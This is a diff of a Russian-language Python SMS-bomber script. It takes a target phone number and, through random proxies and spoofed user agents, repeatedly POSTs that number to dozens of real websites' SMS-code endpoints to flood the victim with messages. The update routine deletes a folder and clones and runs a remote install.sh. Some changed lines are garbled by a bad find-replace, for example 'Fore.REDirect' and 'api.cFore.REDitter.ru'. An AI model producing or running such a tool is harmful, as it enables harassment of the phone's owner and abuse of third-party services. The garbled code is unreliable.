@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 from os import name, system
 from random import choice, randint
-from sys import argv
 from time import sleep
 from colorama import Fore, Style
 from fake_useragent import UserAgent
@@ -21,54 +20,55 @@ def banner():
 
 
 def main():
-    try:
-        phone = argv[1]
-        start_sms_spam(phone)
-    except IndexError:
-        banner()
-        print("[1] СМС СПАМЕР.")
-        print("[2] ОБНОВИТЬ СПАМЕР.")
-        print("[3] ВЫХОД.")
+    banner()
+    print("[1] СМС СПАМЕР.")
+    print("[2] ОБНОВИТЬ СПАМЕР.")
+    print("[3] ВЫХОД.")
+    number = input(f"\n{Style.BRIGHT}{Fore.BLUE}Введите номер пункта: {Style.RESET_ALL}")
+    if number == "1":
+        spam_handler()
+    elif number == "2":
+        update()
+    elif number == "3":
         print()
-        number = input(Style.BRIGHT + Fore.BLUE + "Введите номер пункта: " + Style.RESET_ALL)
-        if number == "1":
-            sms_spam()
-        elif number == "2":
-            update()
-        elif number == "3":
-            print()
-            exit()
-        else:
-            print()
-            print(Style.BRIGHT + Fore.RED + "[*] Номер пункта введён неверно" + Style.RESET_ALL)
-            sleep(1)
-            main()
+        exit()
+    else:
+        print(f"\n{Style.BRIGHT}{Fore.RED}[*] Номер пункта введён неверно{Style.RESET_ALL}")
+        sleep(1)
+        main()
 
 
-def sms_spam():
+def spam_handler():
     check_internet()
     check_version()
     banner()
-    print("Введите телефон")
-    phone = input(Style.BRIGHT + Fore.BLUE + "spammer >> " + Style.RESET_ALL)
+    print("Введите номер телефона")
+    phone = input(f"{Style.BRIGHT}{Fore.BLUE}spammer >> {Style.RESET_ALL}")
     phone = parse_phone(phone)
-    start_sms_spam(phone)
+    start_spam(phone)
 
 
-def start_sms_spam(phone):
+def start_spam(phone):
+    def format_phone(phone, phone_mask):
+        phone_list = list(phone)
+        for i in phone_list:
+            phone_mask = phone_mask.replace("#", i, 1)
+        return phone_mask
+
     name = ""
+    password = ""
+    email = ""
     for _ in range(12):
         name = name + choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
         password = name + choice("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
         email = name + "@gmail.com"
     phone9 = phone[1:]
     user_agent = UserAgent().random
-    proxies = generate_proxy()
+    proxies = get_proxy()
     banner()
-    print("Телефон: " + Style.BRIGHT + Fore.BLUE + phone + Style.RESET_ALL)
-    print("Спамер запущен.")
-    print()
-    print(Style.BRIGHT + Fore.RED + "[*] Ctrl + Z для выхода." + Style.RESET_ALL)
+    print(f"Телефон: {Style.BRIGHT}{Fore.BLUE}{phone}{Style.RESET_ALL}")
+    print(f"Спамер запущен.")
+    print(f"\n{Style.BRIGHT}{Fore.RED}[!] Ctrl+Z для остановки.{Style.RESET_ALL}")
     while True:
         try:
             formatted_phone = format_phone(phone, "+# (###) ###-##-##")
@@ -94,7 +94,7 @@ def start_sms_spam(phone):
         try:
             formatted_phone = format_phone(phone, "+# (###) ###-##-##")
             post("https://yaponchik.net/login/login.php",
-                 data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/",
+                 data={"login": "Y", "countdown": "0", "step": "phone", "Fore.REDirect": "/profile/",
                        "phone": formatted_phone, "code": ""},
                  headers={"User-Agent": user_agent})
         except:
@@ -864,7 +864,7 @@ def start_sms_spam(phone):
             pass
         try:
             formatted_phone = format_phone(phone, "+# (###) ###-##-##")
-            post("https://api.creditter.ru/confirm/sms/send",
+            post("https://api.cFore.REDitter.ru/confirm/sms/send",
                  json={"phone": formatted_phone, "type": "register"},
                  headers={"User-Agent": user_agent})
         except:
@@ -915,7 +915,7 @@ def start_sms_spam(phone):
             pass
         try:
             formatted_phone = format_phone(phone9, "(###)###-##-##")
-            post("https://bluefin.moscow/auth/register/",
+            post("https://Fore.BLUEfin.moscow/auth/register/",
                  data={"phone": formatted_phone, "sendphone": "Далее"},
                  headers={"User-Agent": user_agent})
         except:
@@ -973,67 +973,53 @@ def start_sms_spam(phone):
 
 def parse_phone(phone):
     if phone != "":
-        if int(len(phone)) in (10, 11, 12):
-            if phone[0] == "+":
-                phone = phone[1:]
-            elif phone[0] == "8":
-                phone = "7" + phone[1:]
-            elif phone[0] == "9":
-                phone = "7" + phone
+        if phone[0] == "+":
+            phone = phone[1:]
+        elif phone[0] == "8":
+            phone = "7" + phone[1:]
+        elif phone[0] == "9":
+            phone = "7" + phone
+        if len(phone) in (10, 11, 12) and (phone[:2] == "79" or phone[:2] == "77" or phone[:3] == "380" or phone[:3] == "375"):
+            return phone
         else:
-            print()
-            print(Style.BRIGHT + Fore.RED + "[*] Номер телефона введён неверно" + Style.RESET_ALL)
+            print(f"\n{Style.BRIGHT}{Fore.RED}[*] Номер телефона введён неверно{Style.RESET_ALL}")
             sleep(1)
-            sms_spam()
-        return phone
+            spam_handler()
     else:
         main()
 
 
-def generate_proxy():
+def get_proxy():
     proxy = get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
-    if "limit" in proxy:
-        pass
     return {"http": proxy, "https": proxy}
-
-
-def format_phone(phone, phone_mask):
-    if len(phone) == phone_mask.count("#"):
-        phone_list = list(phone)
-        for i in phone_list:
-            phone_mask = phone_mask.replace("#", i, 1)
-        return phone_mask
 
 
 def check_internet():
     try:
-        get("http://google.com")
-    except:
-        print()
-        print(Style.BRIGHT + Fore.RED + "[*] Нет подключения к интернету" + Style.RESET_ALL)
-        print()
+        get("http://google.com", verify=True)
+    except Exception:
+        print(f"\n{Style.BRIGHT}{Fore.RED}[*] Нет подключения к интернету{Style.RESET_ALL}\n")
         exit()
     return
 
 
 def check_version():
-    current_version = "2.3"
-    version = get("https://raw.githubusercontent.com/cludeex/spammer/master/version.txt").text
-    if float(current_version) < float(version):
-        print()
-        print(Style.BRIGHT + Fore.RED + "[*] Версия устарела и нуждается в обновлении!" + Style.RESET_ALL)
+    version = "2.4"
+    if float(version) < float(get("https://raw.githubusercontent.com/cludeex/spammer/master/version.txt").text):
+        print(f"\n{Style.BRIGHT}{Fore.RED}[*] Версия устарела и нуждается в обновлении!{Style.RESET_ALL}")
         sleep(2)
         main()
-    return
+    else:
+        return
 
 
 def update():
-    check_internet()
     banner()
     print("Вы уверены, что хотите обновить? (y/n)")
-    update = input(Style.BRIGHT + Fore.BLUE + "spammer >> " + Style.RESET_ALL)
-    if update == "y":
-        system("cd && rm -rf ~/spammer && git clone https://github.com/cludeex/spammer && sh ~/spammer/install.sh")
+    update = input(f"{Style.BRIGHT}{Fore.BLUE}spammer >> {Style.RESET_ALL}")
+    if update.lower() == "y":
+        system("cls" if name == "nt" else "clear")
+        system("cd && rm -rf spammer && git clone https://github.com/cludeex/spammer && cd spammer && sh install.sh")
         exit()
     else:
         main()
